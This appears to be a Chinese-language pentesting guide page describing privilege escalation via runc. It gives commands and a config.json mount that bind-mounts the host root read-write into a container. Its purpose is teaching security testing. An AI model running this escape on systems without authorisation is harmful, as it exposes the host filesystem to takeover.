# RunC 权限提升

## 基本信息

如果你想进一步了解 **runc**，请查看以下页面：

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

如果主机上的 rootful 进程可以使用 `runc`，你可以使用一个 OCI bundle，其挂载配置会将主机的 `/` 递归 bind-mount 到容器内部的 `/`，从而在该挂载命名空间中暴露主机文件系统。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> 文档中介绍的 `runc run` 工作流程是 rootful：runc 自身的示例将其标记为 "run as root。" 非特权用户需要使用类似 `runc spec --rootless` 的 rootless 配置，并且 runc 文档说明必须为该模式启用 user namespaces。<sup>[[1]](#references)</sup>

## References

- [1] [runc：用于生成和运行容器的 CLI 工具](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification：Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
